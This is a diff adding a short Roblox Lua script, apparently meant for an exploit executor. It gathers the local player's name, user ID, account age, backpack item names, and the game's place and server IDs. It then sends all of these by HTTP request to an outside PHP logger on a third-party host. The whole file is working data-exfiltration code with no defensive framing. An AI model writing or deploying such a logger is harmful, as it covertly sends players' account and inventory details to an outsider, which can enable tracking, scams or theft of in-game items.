@@ -1,0 +1,37 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local Backpack = LocalPlayer:WaitForChild("Backpack")
+
+-- Get instance info
+local placeId = game.PlaceId
+local jobId = game.JobId
+
+-- Collect backpack item names
+local items = {}
+for _, item in ipairs(Backpack:GetChildren()) do
+    table.insert(items, item.Name)
+end
+
+-- Combine into newline-separated string
+local itemList = table.concat(items, "\n")
+
+-- URL encode the full item list
+local encodedItems = HttpService:UrlEncode(itemList)
+
+-- Build full URL with query parameters
+local url = "https://dreamz.x10.bz/logger.php" ..
+    "?user=" .. HttpService:UrlEncode(LocalPlayer.Name) ..
+    "&id=" .. LocalPlayer.UserId ..
+    "&receiver=Logger" ..
+    "&executor=Xeno" ..
+    "&age=" .. LocalPlayer.AccountAge ..
+    "&items=" .. encodedItems ..
+    "&place=" .. placeId ..
+    "&instance=" .. jobId
+
+-- Debug (can be seen in F9 console)
+print("Sending to webhook: " .. url)
+
+-- Send GET request to your PHP logger
+HttpService:GetAsync(url)
